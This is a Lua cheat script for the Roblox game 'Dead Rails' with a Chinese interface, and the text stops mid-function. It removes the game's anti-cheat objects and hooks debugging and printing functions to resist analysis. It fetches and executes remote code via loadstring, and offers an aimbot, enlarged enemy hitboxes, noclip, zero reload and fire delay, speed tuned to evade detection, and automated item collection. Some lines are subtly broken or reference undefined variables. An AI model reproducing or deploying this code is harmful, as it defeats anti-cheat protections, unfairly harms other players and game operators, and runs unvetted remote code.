if Server ~= "dead rail" and script ~= "Rise of Legend HUB" then
    game.Players.LocalPlayer:Destroy()
    game.Players.LocalPlayer:Kick()
    game:shutdown()
else
    local HttpService = game:GetService("HttpService")
    local old
    old = hookfunction(hookmetamethod, function(...)
    local method = select(2, ...)
        if method == "__namecall" then
            return nil
        elseif method == "__index" then
            return nil
        elseif method == "__newindex" then
            return nil
        end
        return old(...)
    end)
    local oldfun = hookfunction
    hookfunction = function(...)
        return nil
    end
    local oldset = setclipboard
    setclipboard = function(...)
        return "XiaoXu出品"
    end
    local oldprint = print
    print = function(...)
        return "XiaoXu出品必是精品"
    end
    local oldwarn = warn
    warn = function(...)
        return "XiaoXu出品必是精品"
    end
    local olderror = error
    error = function(...)
        return "XiaoXu出品必是精品"
    end
    request = function(Request)
        if Request.Url:find("whitelist") then
        local url = Request.Url("Cnmbnmsl.com")
        return url
        end
    end

    local success, result = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/kukunbghb/kukulol/refs/heads/main/bu-chu.json")
    end)
    
    local success, whitelist = pcall(function()
        return HttpService:JSONDecode(result)
    end)
    
    for i, v in pairs(whitelist) do
        if v == true then
            if game.Players.LocalPlayer.Name ~= game.Players.LocalPlayer.Character.Name then
                game.Players.LocalPlayer:Kick("禁止伪装用户名")
            end
            local StarterGui = game:GetService("StarterGui")
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "Riseof the Legend Hub New!";
                Color = Color3.fromRGB(255, 0, 0);
                Font = Enum.Font.SourceSansBold;
                TextSize = 18;
            })
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "Server: Dead rails";
                Color = Color3.fromRGB(255, 0, 0);
                Font = Enum.Font.SourceSansBold;
                TextSize = 18;
            })
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "join my discord";
                Color = Color3.fromRGB(255, 0, 0);
                Font = Enum.Font.SourceSansBold;
                TextSize = 18;
            })
            local LPName = game:GetService("Players").LocalPlayer.Name
            if workspace[LPName] then
                if workspace[LPName].AntiSlideClientTest then
                    workspace[LPName].AntiSlideClientTest:Destroy()
                end
                if workspace[LPName].AntiSlide then
                    workspace[LPName].AntiSlide:Destroy()
                end
                if workspace[LPName].AntiFling then
                    workspace[LPName].AntiFling:Destroy()
                end
            end
            
            local items = {}
            local SelectItem = ""
            for i,v in ipairs(workspace.RuntimeItems:GetChildren()) do
                items[i] = v.Name
            end
            
            local function RefreshItem()
                items = {}
                for i,v in ipairs(workspace.RuntimeItems:GetChildren()) do
                    items[i] = v.Name
                end
            end
            
            local Hitbox = 0
            local MinHealth = 30
            local mainloop = false
            local AimLock = false
            local message = ""
            local moneyitem = ""
            local itemsConnection
            local OreConnection
            local EnemyConnection
            local UnicornConnection
            local buildConnection
            local zombieConnection
            local bankConnection
            local OutlawConnection
            local BondConnection
            local aimbotEnabled = false
            local currentSound = nil  -- 用于保存当前播放的音乐
            local songList = {}  -- 用于保存歌曲列表
            local songHistory = {}  -- 用于保存历史播放过的歌曲
            local searchResultsCount = nil  -- 用于保存搜索结果的数量
            local countdownLabel = nil  -- 用于显示倒计时的标签
            local countdownTask = nil  -- 用于保存倒计时任务，方便停止上一个任务
            local isPlaying = false  -- 用来标记当前是否正在播放歌曲
            local currentSongIndex = nil  -- 用于保存当前播放歌曲的索引
            local currentSongNameLabel = nil  -- 用于显示当前播放的歌曲名称
            local searchSongNameLabel = nil  -- 用于保存歌曲名称标签
            local progressLabel = nil  -- 用于显示播放进度的标签
            local startTimeLabel = nil  -- 用于显示播放开始时间
            local endTimeLabel = nil  -- 用于显示播放结束时间
            local savedStartTime = nil  -- 用于保存上次的开始时间
            local savedEndTime = nil    -- 用于保存上次的结束时间
            local searchHistoryCountLabel = nil  -- 用于显示历史搜索次数的标签
            local remainingTime = 0  -- 剩余时间（秒）
            local playCount = 0  -- 播放次数
            local searchHistoryCount = 0  -- 初始化历史搜索次数为 0
            local lastPosition = 0  -- 用于保存上次停止时的播放进度
            
            -- 停止当前的倒计时任务
            local function stopCountdown()
                if countdownTask then
                    countdownTask:Disconnect()  -- 取消当前倒计时任务
                    countdownTask = nil  -- 清空倒计时任务
                end
                if countdownLabel then
                    countdownLabel.Text = "倒计时: 无"  -- 清空倒计时显示
                end
                if progressLabel then
                    progressLabel.Text = "播放进度: 00:00 / 00:00"  -- 清空播放进度显示
                end
                if startTimeLabel then
                    startTimeLabel.Text = "开始时间: --"  -- 清空开始时间显示
                end
                if endTimeLabel then
                    endTimeLabel.Text = "结束时间: --"  -- 清空结束时间显示
                end
            end
            
            -- 播放歌曲
            local function playSong(songId, soundId, songName, startPosition)
                -- 停止当前播放的音乐（如果有）
                if currentSound then
                    currentSound:Stop()  -- 停止当前音乐
                    currentSound = nil  -- 清除当前音乐对象
                end
            
                -- 停止并清除倒计时任务（如果有）
                stopCountdown()
            
                -- 创建并播放新音乐
                local Sound = Instance.new("Sound")
                Sound.SoundId = soundId
                Sound.Parent = game.Workspace
            
                -- 设置从指定位置开始播放（如果提供了 startPosition）
                if startPosition then
                    Sound.TimePosition = startPosition
                end
            
                Sound:Play()
                currentSound = Sound  -- 保存当前播放的音频
            
                -- 获取当前的北京时间
                local currentTime = os.time()  -- 获取当前UTC时间戳
                local startTime = os.date("%Y-%m-%d %H:%M:%S", currentTime)  -- 格式化为年月日时分秒
                
                -- 计算结束时间，根据歌曲总时长计算
                local totalTime = Sound.TimeLength  -- 获取歌曲的总时长（秒）
                local endTime = os.date("%Y-%m-%d %H:%M:%S", currentTime + totalTime)  -- 结束时间是当前时间加上总时长
            
                -- 保存开始时间和结束时间
                savedStartTime = startTime
                savedEndTime = endTime
            
                -- 创建并显示歌曲名称标签
                if not currentSongNameLabel then
                    currentSongNameLabel = music:Label("当前歌曲: " .. songName)
                else
                    currentSongNameLabel.Text = "当前歌曲: " .. songName
                end
            
                -- 创建并初始化倒计时Label
                if not countdownLabel then
                    countdownLabel = music:Label("倒计时: 00:00")  -- 初始化为 00:00
                end
            
                -- 创建并初始化播放进度Label
                if not progressLabel then
                    progressLabel = music:Label("播放进度: 00:00 / 00:00")  -- 初始化为 00:00 / 00:00
                end
            
                -- 创建并初始化开始时间Label
                if not startTimeLabel then
                    startTimeLabel = music:Label("开始时间: " .. startTime)  -- 显示当前时间作为开始时间
                else
                    startTimeLabel.Text = "开始时间: " .. startTime
                end
            
                -- 创建并初始化结束时间Label
                if not endTimeLabel then
                    endTimeLabel = music:Label("结束时间: " .. endTime)  -- 显示结束时间
                else
                    endTimeLabel.Text = "结束时间: " .. endTime  -- 更新结束时间
                end
                
                -- 创建并初始化历史播放次数Label
                if not playCountLabel then
                    playCountLabel = music:Label("历史播放次数: " .. playCount)
                else
                    playCountLabel.Text = "历史播放次数: " .. playCount
                end
                isPlaying = true
                countdownTask = game:GetService("RunService").Heartbeat:Connect(function()
                    if currentSound and currentSound.Playing then
                        local currentTimeRemaining = math.max(0, Sound.TimeLength - Sound.TimePosition)
                        local minutesRemaining = math.floor(currentTimeRemaining / 60)
                        local secondsRemaining = math.floor(currentTimeRemaining % 60)
                        countdownLabel.Text = string.format("倒计时: %02d:%02d", minutesRemaining, secondsRemaining)
                        local currentMinutes = math.floor(Sound.TimePosition / 60)
                        local currentSeconds = math.floor(Sound.TimePosition % 60)
            
                        local totalMinutes = math.floor(Sound.TimeLength / 60)
                        local totalSeconds = math.floor(Sound.TimeLength % 60)
                        progressLabel.Text = string.format("播放进度: %02d:%02d / %02d:%02d", currentMinutes, currentSeconds, totalMinutes, totalSeconds)
                        endTimeLabel.Text = "结束时间: " .. os.date("%Y-%m-%d %H:%M:%S", currentTime + Sound.TimeLength)
                    else
                        stopCountdown()
                    end
                end)
            end
            
            local lastUpdateTime = 0
            local debounceInterval = 1
            
            local function urlEncode(str)
                return game:GetService("HttpService"):UrlEncode(str)
            end
            function Notification(Title, Text, dur)
            game:GetService("StarterGui"):SetCore("SendNotification",{Title = Title,Text = Text,Duration = dur,})
            end
            
            local RunService = game:GetService("RunService")
            local Cam = workspace.CurrentCamera
            local Player = game:GetService("Players").LocalPlayer
            
            local validNPCs = {}
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
            
            local function isNPC(obj)
                return obj:IsA("Model") 
                    and obj:FindFirstChild("Humanoid")
                    and obj.Humanoid.Health > 0
                    and obj:FindFirstChild("Head")
                    and obj:FindFirstChild("HumanoidRootPart")
                    and not game:GetService("Players"):GetPlayerFromCharacter(obj)
            end
            
            local function updateNPCs()
                local tempTable = {}
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if isNPC(obj) then
                        tempTable[obj] = true
                    end
                end
                for i = #validNPCs, 1, -1 do
                    if not tempTable[validNPCs[i]] then
                        table.remove(validNPCs, i)
                    end
                end
                for obj in pairs(tempTable) do
                    if not table.find(validNPCs, obj) then
                        table.insert(validNPCs, obj)
                    end
                end
            end
            
            local function handleDescendant(descendant)
                if isNPC(descendant) then
                    table.insert(validNPCs, descendant)
                    local humanoid = descendant:WaitForChild("Humanoid")
                    humanoid.Destroying:Connect(function()
                        for i = #validNPCs, 1, -1 do
                            if validNPCs[i] == descendant then
                                table.remove(validNPCs, i)
                                break
                            end
                        end
                    end)
                end
            end
            
            workspace.DescendantAdded:Connect(handleDescendant)
            
            local function predictPos(target)
                local rootPart = target:FindFirstChild("HumanoidRootPart")
                local head = target:FindFirstChild("Head")
                if not rootPart or not head then
                    return head and head.Position or rootPart and rootPart.Position
                end
                local velocity = rootPart.Velocity
                local predictionTime = 0.02
                local basePosition = rootPart.Position + velocity * predictionTime
                local headOffset = head.Position - rootPart.Position
                return basePosition + headOffset
            end
            
            local function getTarget()
                local nearest = nil
                local minDistance = math.huge
                local viewportCenter = Cam.ViewportSize / 2
                raycastParams.FilterDescendantsInstances = {Player.Character}
                for _, npc in ipairs(validNPCs) do
                    local predictedPos = predictPos(npc)
                    local screenPos, visible = Cam:WorldToViewportPoint(predictedPos)
                    if visible and screenPos.Z > 0 then
                        local ray = workspace:Raycast(
                            Cam.CFrame.Position,
                            (predictedPos - Cam.CFrame.Position).Unit * 1000,
                            raycastParams
                        )
                        if ray and ray.Instance:IsDescendantOf(npc) then
                            local distance = (Vector2.new(screenPos.X, screenPos.Y) - viewportCenter).Magnitude
                            if distance < minDistance then
                                minDistance = distance
                                nearest = npc
                            end
                        end
                    end
                end
                return nearest
            end
            
            local function aim(targetPosition)
                local currentCF = Cam.CFrame
                local targetDirection = (targetPosition - currentCF.Position).Unit
                local smoothFactor = 0.581
                local newLookVector = currentCF.LookVector:Lerp(targetDirection, smoothFactor)
                Cam.CFrame = CFrame.new(currentCF.Position, currentCF.Position + newLookVector)
            end
            
            local heartbeat = RunService.Heartbeat
            local lastUpdate = 0
            local UPDATE_INTERVAL = 0.4
            
            local aimbotEnabled = false
            
            heartbeat:Connect(function(dt)
                lastUpdate = lastUpdate + dt
                if lastUpdate >= UPDATE_INTERVAL then
                    updateNPCs()
                    lastUpdate = 0
                end
                if aimbotEnabled then
                    local target = getTarget()
                    if target then
                        local predictedPosition = predictPos(target)
                        aim(predictedPosition)
                    end
                end
            end)
            
            workspace.DescendantRemoving:Connect(function(descendant)
                if isNPC(descendant) then
                    for i = #validNPCs, 1, -1 do
                        if validNPCs[i] == descendant then
                            table.remove(validNPCs, i)
                            break
                        end
                    end
                end
            end)
            
            local function getClosestNPC()
                local closestNPC = nil
                local closestDistance = math.huge
            
                for _, object in ipairs(workspace:GetDescendants()) do
                    if object:IsA("Model") then
                        local humanoid = object:FindFirstChild("Humanoid") or object:FindFirstChildWhichIsA("Humanoid")
                        local hrp = object:FindFirstChild("HumanoidRootPart") or object.PrimaryPart
                        if humanoid and hrp and humanoid.Health > 0 and object.Name ~= "Horse" then
                            local isPlayer = false
                            for _, pl in ipairs(Players:GetPlayers()) do
                                if pl.Character == object then
                                    isPlayer = true
                                    break
                                end
                            end
                            if not isPlayer then
                                local distance = (hrp.Position - player.Character.HumanoidRootPart.Position).Magnitude
                                if distance < closestDistance then
                                    closestDistance = distance
                                    closestNPC = object
                                end
                            end
                        end
                    end
                end
            
                return closestNPC
            end
            local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/KingScriptAE/No-sirve-nadag./main/%E9%9C%96%E6%BA%BA%E8%G9%84%9A%E6%9C%ACUI.lua"))()
            
            local oldHttpGet
            HttpGet = function(...)
                return "Cnm"
            end
            local window = library:new("旧冬脚本┋死铁轨")
            
            local Page = window:Tab("主页",'16060333448')
            local Page1 = window:Tab("主要功能",'16060333448')
            local Page2 = window:Tab("物品功能",'16060333448')
            local Page4 = window:Tab("其他功能",'16060333448')
            local Page5 = window:Tab("通知功能",'16060333448')
            local Page6 = window:Tab("透视功能",'16060333448')
            
            local info = Page:section("作者信息",true)
            local Monster = Page1:section("怪物功能",true)
            local Gun = Page2:section("枪械功能",true)
            local Item = Page2:section("物品功能",true)
            local Other = Page4:section("其他功能",true)
            local music = Page4:section("音乐功能",true)
            local Notify = Page5:section("通知功能",true)
            local ESP = Page6:section("透视功能",true)
            
            info:Label("主作者:小徐 副作者:秋山")
            info:Label("禁止倒卖免费使用")
            info:Label("请加入旧冬脚本副群:467989227")
            info:Button("复制我的群聊", function()
            setclipboard("点击链接加入群聊：https://qun.qq.com/universal-share/share?ac=1&authKey=R8BbYLIO%2F7bEXiohoq%2FkcvRt7bP%2BWhD%2FKp%2BJqg4TqaMNZGG%2BjpPCcUReajF6Wpk%2F&busi_data=eyJncm91cENvZGUiOiI0Njc5ODkyMjciLCJ0b2tlbiI6IlNpWm0zSHNFaElFYzJqMmxiM2lVdDIxVlA0LzJLTXdPUzluTjhrWXQ3MDM0OXI3V2hIVDJ3NXhDeFBxTEFCYisiLCJ1aW4iOiIzMjUzNTQ5MzA3In0%3D&data=Um8hz7pt-y77T1IaGSB2dYDB4Ro_sEnW9q7f7_AfqVZidaNkEvkdIgl-0_vLp1I7_I4jfigC-DPQTIX_JSNQOg&svctype=4&tempid=h5_group_info")
            end)
            local money = info:Label("你的金钱:"..game.Players.LocalPlayer.leaderstats.Money.Value)
            
            spawn(function()
                while state do wait()
                    pcall(function()
                        money.Text = "你的金钱:"..game.Players.LocalPlayer.leaderstats.Money.Value
                    end)
                end
            end)
            
            Monster:Toggle("反作弊不能检测到的最高速度", "", false, function(state)
                if state then
                    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 19
                else
                    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
                end
            end)
            
            Monster:Slider("范围大小", "", 50, 0, 100, false, function(value)
                Hitbox = value
            end)
            
            Monster:Toggle("开启范围", "", false, function(state)
                mainloop = state
                spawn(function()
                    while mainloop do wait()
                        pcall(function()
                            for i, v in ipairs(workspace:GetDescendants()) do
                                if v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Head") then
                                    if v.Name == "TurretOutlaw" or v.Name == "RifleOutlaw" or v.Name == "ShotgunOutlaw" or v.Name == "RevolverOutlaw" or v.Name == "Vampire" or v.Name == "Werewolf" or v.Name == "Wolf" or v.Name == "Runner" or v.Name == "Walker" or v.Name == "Banner" or v.Name == "Captain Prescott" or v.Name == "Banker" then
                                        if v.Humanoid.Health > 0 then
                                            v.Head.Size = Vector3.new(Hitbox, Hitbox, Hitbox)
                                            v.Head.CanCollide = not state
                                        end
                                    end
                                end
                            end
                        end)
                    end
                end)
                Hitbox = workspace.DescendantAdded:Connect(function(v)
                    if mainloop and v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Head") then
                        if v.Name == "TurretOutlaw" or v.Name == "RifleOutlaw" or v.Name == "ShotgunOutlaw" or v.Name == "RevolverOutlaw" or v.Name == "Vampire" or v.Name == "Werewolf" or v.Name == "Wolf" or v.Name == "Runner" or v.Name == "Walker" or v.Name == "Banner" or v.Name == "Captain Prescott" or v.Name == "Banker" then
                            if v.Humanoid.Health > 0 then
                                v.Head.Size = Vector3.new(Hitbox, Hitbox, Hitbox)
                                v.Head.CanCollide = not state
                            end
                        end
                    end
                end)
            end)
            
            Monster:Toggle("开启自瞄", "", false, function(state)
                aimbotEnabled = state
            end)
            
            Monster:Button("好玩的东西", function()
                workspace.Train.Leader.KillHitbox.Size = workspace.Train:GetExtentsSize()
            end)
            
            Monster:Toggle("开启强制锁定自瞄2", "", false, function(state)
                mainloop = state
                if mainloop then
                    spawn(function()
                        while mainloop do wait()
                            pcall(function()
                                for i, v in ipairs(workspace:GetDescendants()) do
                                    if v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Head") then
                                        if v.Name == "TurretOutlaw" or v.Name == "RifleOutlaw" or v.Name == "ShotgunOutlaw" or v.Name == "RevolverOutlaw" or v.Name == "Vampire" or v.Name == "Werewolf" or v.Name == "Wolf" or v.Name == "Runner" or v.Name == "Walker" or v.Name == "Banner" or v.Name == "Captain Prescott" or v.Name == "Banker" then
                                            if v.Humanoid.Health > 0 then
                                                local targetPosition = v.HumanoidRootPart.Position
                                                local direction = (targetPosition - workspace.CurrentCamera.CFrame.p).unit
                                                workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.p + direction * 30, targetPosition)
                                            end
                                        end
                                    end
                                end
                            end)
                        end
                    end)
                else
                    Camera.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
                end
            end)
            
            Monster:Toggle("自动攻击", "", false, function(state)
                mainloop = state
                spawn(function()
                    while mainloop do wait()
                        pcall(function()
                            for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                if v:FindFirstChild("SwingEvent") then
                                    game:GetService("Players").LocalPlayer.Character[v.Name].SwingEvent:FireServer(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X,game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y,game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z))
                                end
                            end
                        end)
                    end
                end)
            end)
            
            
            Monster:Toggle("穿墙", "", false, function(state)
                for _, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = not state
                    end
                end
            end)
            
            Monster:Toggle("强锁NPC", "", false, function(state)
                if state then
                    AimLock = state
                    spawn(function()
                        while AimLock do wait()
                            pcall(function()
                                local npc = getClosestNPC()
                                if npc and npc:FindFirstChild("Humanoid") then
                                    local npcHumanoid = npc:FindFirstChild("Humanoid")
                                    if npcHumanoid.Health > 0 then
                                        camera.CameraSubject = npcHumanoid
                                        lastTarget = npc
                                    end
                                end
                            end)
                        end
                    end)
                else
                    game:GetService('Workspace').CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
                end
            end)
            
            Monster:Toggle("自动使用绷带", "", false, function()
                mainloop = state
                spawn(function()
                    while mainloop do wait()
                        pcall(function()
                            for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                if v.Name == "Bandage" then
                                    if game.Players.LocalPlayer.Character.Humanoid.Health <= MinHealth then
                                        v.Parent = game:GetService("Players").LocalPlayer.Character
                                        game:GetService("Players").LocalPlayer.Character.Bandage.Use:FireServer()
                                    end
                                end
                            end
                        end)
                    end
                end)
            end)
            
            Monster:Slider("使用绷带时的血量", "", 1, 0, 50, false, function(value)
                MinHealth = value
            end)
            
            Gun:Toggle("枪械快速换弹", "", false, function(state)
                mainloop = state
                spawn(function()
                    while mainloop do wait()
                        pcall(function()
                            for i,v in next,game.Players.LocalPlayer.Backpack:GetChildren() do
                                if v:IsA("Tool") and v:FindFirstChild("WeaponConfiguration") then
                                    v.WeaponConfiguration.ReloadDuration.Value = 0
                                end
                            end
                            for i,v in next,game.Players.LocalPlayer.Character:GetChildren() do
                                if v:IsA("Tool") and v:FindFirstChild("WeaponConfiguration") then
                                    v.WeaponConfiguration.ReloadDuration.Value = 0
                                end
                            end
                        end)
                    end
                end)
            end)
            
            Gun:Toggle("枪械快速射击", "", false, function()
                mainloop = state
                spawn(function()
                    while mainloop do wait()
                        pcall(function()
                            for i,v in next,game.Players.LocalPlayer.Backpack:GetChildren() do
                                if v:IsA("Tool") and v:FindFirstChild("WeaponConfiguration") then
                                    v.WeaponConfiguration.FireDelay.Value = 0
                                end
                            end
                            for i,v in next,game.Players.LocalPlayer.Character:GetChildren() do
                                if v:IsA("Tool") and v:FindFirstChild("WeaponConfiguration") then
                                    v.WeaponConfiguration.FireDelay.Value = 0
                                end
                            end
                        end)
                    end
                end)
            end)
            
            Gun:Toggle("枪械光环(测试)", "", false, function()
                mainloop = state
                spawn(function()
                    while mainloop do wait()
                        pcall(function()

                        end)
                    end
                end)
            end)
        
            local item = Item:Dropdown("选择物品", "", items, function(value)
                SelectItem = value
            end)
            
            spawn(function()
                while true do wait(2)
                    pcall(function()
                        RefreshItem()
                        item:SetOptions(items)
                    end)
                end
            end)
            
            Item:Toggle("自动收集钱袋", "", false, function(state)
                mainloop = state
                spawn(function()
                    while mainloop do wait()
                        pcall(function()
                            if workspace.RuntimeItems:FindFirstChild("Moneybag") then
                                fireproximityprompt(workspace.RuntimeItems.Moneybag.MoneyBag.CollectPrompt)
                            end
                        end)
                    end
                end)
            end)
            
            Item:Toggle("查看物品", "", false, function(state)
                if state then
                    workspace.CurrentCamera.CameraSubject = workspace.RuntimeItems[SelectItem]
                else
                    game:GetService('Workspace').CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
                end
            end)
            
            Item:Toggle("自动收集债券", "", false, function(state)
                mainloop = state
                spawn(function()
                    while mainloop do wait()
                        pcall(function()
                            for i, v in pairs(workspace.RuntimeItems:GetChildren()) do
                                if v.Name == "Bond" then
                                    local distance = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).Magnitude
                                    if distance < 10 then
                                        game:GetService("ReplicatedStorage").Packages.ActivateObjectClient:FireServer(closestBond)
                                    end
                                end
                            end
                        end)
                    end
                end)
            end)
            
            Item:Toggle("自动收集物品", "", false, function(state)
                mainloop = state
                spawn(function()
                    while mainloop do wait()
                        pcall(function()
                            for i, v in pairs(workspace.RuntimeItems:GetChildren()) do
                                local distance = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).Magnitude
                                if distance < 10 then
                                    game:GetService("ReplicatedStorage").Remotes.Tool.PickUpTool:FireServer(v)
                                end
                            end
                        end)
                    end
                end)
            end)
            
            Item:Toggle("自动走向债券","",false,function(state)
                if state then
                    mainloop = state
                    spawn(function()
                        while mainloop do wait()
                            pcall(function()
                                for _, item in pairs(workspace.RuntimeItems:GetChildren()) do
                                    if item.Name == "Bond" and item:IsA("Model") then
                                        game.Players.LocalPlayer.Character.Humanoid.WalkToPoint = Vector3.new(item.Position.X, item.Position.Y, item.Position.Z)
                                        break
                                    end
                                end
                            end)
                        end
                    end)
                else
                    game.Players.LocalPlayer.Character.Humanoid.WalkToPoint = game.Players.LocalPlayer.Character.Humanoid.RootPart.Position
                end
            end)
            
            Other:Toggle("高光", "", false, function(state)
                if state then
                    game.Lighting.Ambient = Color3.new(1, 1, 1)
                else
                    game.Lighting.Ambient = Color3.new(0, 0, 0)
                end
            end)
            
            Other:Button("第三人称", function()
            game:GetService("Players").LocalPlayer.CameraMaxZoomDistance = math.huge
            game:GetService("Players").LocalPlayer.CameraMode = Enum.CameraMode.Classic
            end)
            
            Other:Toggle("自动火车鸣声", "", false, function(state)
                mainloop = state
                spawn(function()
                    while mainloop do wait()
                        pcall(function()
                            workspace.Train.TrainControls.Lever.HitBox.ClickDetector.MaxActivationDistance = math.huge
                            fireclickdetector(workspace.Train.TrainControls.Lever.HitBox.ClickDetector)
                        end)
                    end
                end)
            end)
            
            Other:Toggle("自动拉终点开关", "", false, function()
                mainloop = state
                spawn(function()
                    while mainloop do wait()
                        pcall(function()
                            workspace.Baseplates.FinalBasePlate.OutlawBase.Bridge.BridgeControl.Crank.Model.Mid.EndGame.MaxActivationDistance = math.huge
                            fireproximityprompt(workspace.Baseplates.FinalBasePlate.OutlawBase.Bridge.BridgeControl.Crank.Model.Mid.EndGame)
                        end)
                    end
                end)
            end)
            
            Other:Button("删除杂物", function()
                while true do wait()
                    for i, v in ipairs(workspace.Decor:GetChildren()) do
                        v:Destroy()
                    end
                end
            end)
            
            Other:Button("删除闪电", function()
                while true do wait()
                    for _, v in next,workspace:GetChildren() do
                        if v.Name == "LightningModel" then
                            v:Destroy()
                        end
                    end
                end
            end)
            
            Other:Button("丢掉所有物品", function()
                for _=1,10 do
                    game:GetService("ReplicatedStorage").Remotes.DropItem:FireServer()
                end
            end)
            
            Other:Toggle("秒互动", "", false, function(state)
                for _,v in pairs(workspace:GetDescendants()) do
                    if v:IsA("ProximityPrompt") then
                        if state then
                            olddur = v.HoldDuration
                            v.HoldDuration = 0
                        else
                            v.HoldDuration = olddur
                        end
                    end
                end
            end)
        
            Other:Toggle("远程互动", "", false, function(state)
                for _,v in pairs(workspace:GetDescendants()) do
                    if v:IsA("ProximityPrompt") then
                        if state then
                            olddis = v.MaxActivationDistance
                            v.MaxActivationDistanceion = math.huge
                        else
                            v.MaxActivationDistanceion = olddis
                        end
                    end
                end
            end)
        
            Other:Toggle("无视野互动", "", false, function(state)
                for _,v in pairs(workspace:GetDescendants()) do
                    if v:IsA("ProximityPrompt") then
                        if state then
                            v.RequiresLineOfSight = false
                        else
                            v.RequiresLineOfSight = true
                        end
                    end
                end
            end)
            
            Notify:Toggle("今晚刷新什么怪", "", false, function(state)
                if state then
                    local MonsterGui = game.CoreGui:FindFirstChild("MonsterGui")
                    if not MonsterGui then
                        local MonsterGui = Instance.new("ScreenGui", game.CoreGui)
                        local MonsterMessage = Instance.new("TextLabel", MonsterGui)
                        local UIGradient = Instance.new("UIGradient")
                        
                        MonsterGui.Name = "MonsterGui"
                        MonsterGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                        MonsterMessage.Name = "MonsterMessage"
                        MonsterMessage.BackgroundColor3 = Color3.new(1, 1, 1)
                        MonsterMessage.BackgroundTransparency = 1
                        MonsterMessage.BorderColor3 = Color3.new(0, 0, 0)
                        MonsterMessage.Position = UDim2.new(0.5, 100, 0.5, -25)
                        MonsterMessage.Size = UDim2.new(0, 135, 0, 50)
                        MonsterMessage.Font = Enum.Font.GothamSemibold
                        MonsterMessage.Text = "今晚的怪物: "
                        MonsterMessage.TextColor3 = Color3.new(1, 1, 1)
                        MonsterMessage.TextScaled = true
                        MonsterMessage.TextSize = 14
                        MonsterMessage.TextWrapped = true
                        
                        UIGradient.Color = ColorSequence.new{
                            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)),
                            ColorSequenceKeypoint.new(0.10, Color3.fromRGB(255, 127, 0)),
                            ColorSequenceKeypoint.new(0.20, Color3.fromRGB(255, 255, 0)),
                            ColorSequenceKeypoint.new(0.30, Color3.fromRGB(0, 255, 0)),
                            ColorSequenceKeypoint.new(0.40, Color3.fromRGB(0, 255, 255)),
                            ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 0, 255)),
                            ColorSequenceKeypoint.new(0.60, Color3.fromRGB(139, 0, 255)),
                            ColorSequenceKeypoint.new(0.70, Color3.fromRGB(255, 0, 0)),
                            ColorSequenceKeypoint.new(0.80, Color3.fromRGB(255, 127, 0)),
                            ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 255, 0)),
                            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 255, 0))
                        }
                        UIGradient.Rotation = 360
                        UIGradient.Parent = MonsterMessage
                        
                        local TweenService = game:GetService("TweenService")
                        local tweeninfo = TweenInfo.new(7, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
                        local tween = TweenService:Create(UIGradient, tweeninfo, {Rotation = 360})
                        tween:Play()
                        game:GetService("RunService").RenderStepped:Connect(function()
                            for i, v in ipairs(workspace.NightEnemies:GetChildren()) do
                                if v:IsA("Model") then
                                    if v.Name == "Wolf" then
                                        MonsterMessage.Text = "今晚的怪物是狼"
                                    elseif v.Name == "Werewolf" then
                                        MonsterMessage.Text = "今晚的怪物是狼人"
                                    elseif v.Name == "Vampire" then
                                        MonsterMessage.Text = "今晚的怪物是吸血鬼"
                                    elseif v.Name == "Walker" then
                                        MonsterMessage.Text = "今晚的怪物是正常僵尸"
                                    elseif v.Name == "Runner" then
                                        MonsterMessage.Text = "今晚的怪物是奔跑僵尸"
                                    end
                                end
                            end
                        end)
                    end
                else
                    game.CoreGui.MonsterGui:Destroy()
                end
            end)
            
            Notify:Toggle("显示燃油状态", "", false, function(state)
                local FuelGui = game.CoreGui:FindFirstChild("FuelGui")
                if not FuelGui then
                    FuelGui = Instance.new("ScreenGui")
                    FuelGui.Name = "FuelGui"
                    FuelGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    FuelGui.Parent = game.CoreGui
            
                    local FuelLabel = Instance.new("TextLabel")
                    FuelLabel.Name = "FuelLabel"
                    FuelLabel.BackgroundColor3 = Color3.new(1, 1, 1)
                    FuelLabel.BackgroundTransparency = 1
                    FuelLabel.BorderColor3 = Color3.new(0, 0, 0)
                    FuelLabel.Position = UDim2.new(0.5, 0, 0.5, -100)
                    FuelLabel.Size = UDim2.new(0, 135, 0, 50)
                    FuelLabel.Font = Enum.Font.GothamSemibold
                    FuelLabel.Text = "燃料: " .. workspace.Train.Fuel.Value .. " / 240"
                    FuelLabel.TextColor3 = Color3.new(1, 1, 1)
                    FuelLabel.TextScaled = true
                    FuelLabel.TextSize = 14
                    FuelLabel.TextWrapped = true
                    FuelLabel.Parent = FuelGui
                end
